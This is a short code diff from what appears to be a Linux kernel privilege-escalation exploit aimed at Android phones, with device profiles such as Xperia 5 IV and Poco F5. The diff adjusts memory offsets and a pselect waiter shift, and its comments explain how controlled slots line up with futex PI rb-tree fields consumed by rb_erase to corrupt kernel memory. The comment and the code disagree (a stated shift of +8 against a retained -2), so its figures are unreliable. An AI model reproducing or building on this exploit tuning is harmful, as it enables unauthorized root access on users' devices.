@@ -127,9 +127,15 @@ int main(int argc, char **argv) {
     p.geometry.mcast_task_offset = 48;
     p.geometry.mcast_lock_offset = 56;
     if (select_recipe) {
-        /* select() frame geometry shared by the Xperia 5 IV and Poco F5
-         * profiles: waiter base = word0, table base = word2. */
-        p.geometry.pselect_waiter_shift = -2;
+        /* E11: katyusha's waiter sits at fd word 10 (futex side 0x90+0x20+0x90
+         * = B-0x1C0 vs pselect window B-0x210). The route's word table starts
+         * at word 2, so fd_word = table_word + shift needs shift = +8. The
+         * controlled slots (tree_entry + pi_tree parent/right at words 10-14)
+         * coincide exactly with the slots the rb_erase consumes; pi_tree.left
+         * lands in the kernel-zeroed res_* region, which supplies the required
+         * 0 for free. */
+        p.geometry.pselect_waiter_shift = -2;  /* s510/Reirin00 convention */
+        p.misc.compact_waiter = 2;              /* compact==2 => pselect6 carrier */
     }
 
     p.execution.recommended_main_cpu = 4;
